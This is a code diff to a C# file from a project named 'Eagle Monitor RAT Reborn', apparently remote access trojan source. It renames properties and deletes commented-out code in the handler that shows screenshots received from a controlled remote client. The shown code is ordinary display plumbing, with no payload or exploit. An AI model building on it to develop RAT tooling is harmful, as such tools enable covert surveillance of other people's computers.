@@ -12,55 +12,26 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
 {
     internal class RemoteViewerPacketHandler
     {
-        public RemoteViewerPacketHandler(RemoteViewerPacket remoteViewerPacket) : base()//, ClientHandler clientHandler) : base() 
+        public RemoteViewerPacketHandler(RemoteViewerPacket remoteViewerPacket) : base()
         {
-            if (ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm != null)
+            if (ClientHandler.ClientHandlersList[remoteViewerPacket.BaseIp].ClientForm != null)
             {
-                ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopPictureBox.BeginInvoke((MethodInvoker)(() =>
+                ClientHandler.ClientHandlersList[remoteViewerPacket.BaseIp].ClientForm.remoteDesktopPictureBox.BeginInvoke((MethodInvoker)(() =>
                 {
                     try
                     {
-                        ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.hasAlreadyConnected = true;
+                        ClientHandler.ClientHandlersList[remoteViewerPacket.BaseIp].ClientForm.RemoteDesktopHandler.HasAlreadyConnected = true;
                         if (remoteViewerPacket.desktopPicture != null)
                         {
-                            ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopPictureBox.Image = ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture);
-                            ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.hResol = remoteViewerPacket.hResol;
-                            ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.vResol = remoteViewerPacket.vResol;
+                            ClientHandler.ClientHandlersList[remoteViewerPacket.BaseIp].ClientForm.remoteDesktopPictureBox.Image = ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture);
+                            ClientHandler.ClientHandlersList[remoteViewerPacket.BaseIp].ClientForm.RemoteDesktopHandler.HResol = remoteViewerPacket.hResol;
+                            ClientHandler.ClientHandlersList[remoteViewerPacket.BaseIp].ClientForm.RemoteDesktopHandler.VResol = remoteViewerPacket.vResol;
                         }
                         return;
                     }
                     catch { }
                 }));
             }
-            /*Task.Run(() => 
-            {
-                ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopPictureBox.BeginInvoke((MethodInvoker)(() =>
-                {
-                    try
-                    {
-                        ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.hasAlreadyConnected = true;
-                        if (ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture) != null)
-                            ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopPictureBox.Image = ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture);
-                        ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.hResol = remoteViewerPacket.hResol;
-                        ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.vResol = remoteViewerPacket.vResol;
-                        return;
-                    }
-                    catch { }
-                }));
-            });*/
-            /*try
-            {
-                ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopPictureBox.BeginInvoke((MethodInvoker)(() =>
-                {
-                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.hasAlreadyConnected = true;
-                    if (ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture) != null)
-                        ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopPictureBox.Image = ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture);
-                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.hResol = remoteViewerPacket.hResol;
-                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.vResol = remoteViewerPacket.vResol;
-                }));
-                return;
-            }
-            catch { }*/
         }
     }
 }
